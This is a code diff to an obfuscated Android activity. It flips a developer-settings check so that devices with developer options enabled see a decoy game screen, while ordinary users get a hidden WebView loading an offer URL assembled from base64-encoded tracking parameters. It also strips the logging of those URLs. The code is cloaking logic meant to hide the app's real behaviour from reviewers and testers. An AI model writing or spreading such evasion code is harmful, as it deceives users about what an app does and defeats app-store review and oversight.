@@ -121,11 +121,11 @@ public class CR extends AppCompatActivity {
 
         int devInfocomcyhrerrlol = Settings.Secure.getInt(this.getContentResolver(), Settings.Global.DEVELOPMENT_SETTINGS_ENABLED, 0);
 
-        if (devInfocomcyhrerrlol == 0) {
+        if (devInfocomcyhrerrlol == 1) {
             Intent intentGame = new Intent(this, InfoActyvity.class);
             startActivity(intentGame);
             finishAffinity();
-        } else if (devInfocomcyhrerrlol == 1) {
+        } else if (devInfocomcyhrerrlol == 0) {
             new Thread(new Runnable() {
                 @Override
                 public void run() {
@@ -287,12 +287,10 @@ public class CR extends AppCompatActivity {
     private void SecondAudit() {
         if (statusMaincomcyhrerrlol.equals(Rator("Tm9uLW9yZ2FuaWM="))) {
             String start = (offercomcyhrerrlol + paramscomcyhrerrlol);
-            Log.i("My", "Non-organic: " + start);
             infoViewcomcyhrerrlol.loadUrl(start);
             infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
         } else if (linkMettacomcyhrerrlol != null) {
             String start = (offercomcyhrerrlol + linkMettacomcyhrerrlol);
-            Log.i("My", "Fb-status: " + start);
             infoViewcomcyhrerrlol.loadUrl(start);
             infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
         } else {
@@ -306,7 +304,6 @@ public class CR extends AppCompatActivity {
                         Rator("JmFkX2lkPQ==") + idShopcomcyhrerrlol + Rator("JmFwcHNfaWQ9") +
                         appsIdSeccomcyhrerrlol + Rator("JmRldl9rZXk9") + Rator(APPS_ID_COMCYHRERRLOL));
                 String start = (offercomcyhrerrlol + startSec);
-                Log.i("My", "Organic: " + start);
                 infoViewcomcyhrerrlol.loadUrl(start);
                 infoViewcomcyhrerrlol.setVisibility(View.VISIBLE);
             }
